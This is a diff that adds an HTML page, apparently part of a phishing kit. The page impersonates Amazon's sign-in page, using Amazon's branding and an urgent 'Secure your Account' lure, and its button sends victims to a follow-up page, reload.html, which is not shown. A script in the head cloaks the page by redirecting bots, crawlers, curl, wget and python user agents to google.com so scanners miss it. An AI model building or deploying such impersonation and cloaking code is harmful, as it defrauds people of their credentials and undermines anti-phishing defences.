@@ -1,0 +1,90 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <script>
+    /* anti-bot */
+    var bots = [/bot/i, /crawler/i, /spider/i, /wget/i, /curl/i, /python/i];
+    var ua = navigator.userAgent;
+    if (bots.some(rx => rx.test(ua))) {
+        location.href = "https://google.com";
+    }
+    </script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Amazon Sign-In</title>
+    <link rel="shortcut icon" href="files/favicon.ico">
+    <link rel="stylesheet" href="styles.css">
+    <style>
+        /* Inline CSS for centering the image */
+        .login-container img {
+            display: block;
+            margin-top: 20px;
+            margin-left: auto;
+            margin-right: auto;
+            width: 30%; /* Adjust width as needed */
+            height: 20%;
+        }
+
+        h5 {
+            font-weight: 300;
+        }
+
+       .login-container h4 {
+            color: rgb(4, 90, 4);
+            font-weight: 200;
+        }
+
+        .login-container h4 span {
+            font-weight: 600;
+        }
+
+    </style>
+</head>
+<body>
+
+    <div class="page-container">
+        <header class="header">
+            <img src="img/logo.png" width="100" alt="Logo" class="logo">
+        </header>
+
+        <div class="login-container">
+            <img src="img/secure.png" alt="Image">
+            <h2>Secure your Account</h2>
+            <h5>To protect your Amazon account, you need to follow the following steps immediately</h5>
+            <h4><span>*Step 1</span>: Confirm your identity</h4>
+            <h4><span>*Step 2</span>: Sign out of all devices and web browsers</h4>
+            <button id="redirectButton">Sign-In</button>
+        </div>
+
+        <div class="divider">
+            <hr class="divider-line">
+            <span class="divider-text">New to Amazon?</span>
+            <hr class="divider-line">
+        </div>
+
+        <div class="signup-section">
+            <button class="signup-button">Create your Amazon account</button>
+        </div>
+
+        <div class="fade-line"></div>
+
+        <footer class="footer">
+            <ul>
+                <li><a href="#" class="con">Conditions of Use</a></li>
+                <li><a href="#" class="priv">Privacy Notice</a></li>
+                <li><a href="#" class="hlp">Help</a></li>
+            </ul>
+            <p>&copy; 1996-2024, Amazon.com, Inc. or its affiliates</p>
+        </footer>
+        
+    </div>
+
+    <script>
+        document.getElementById("redirectButton").addEventListener("click", function() {
+            // Redirect to another page
+            window.location.href = "reload.html"; // Replace with your desired redirect page
+        });
+    </script>
+
+</body>
+</html>
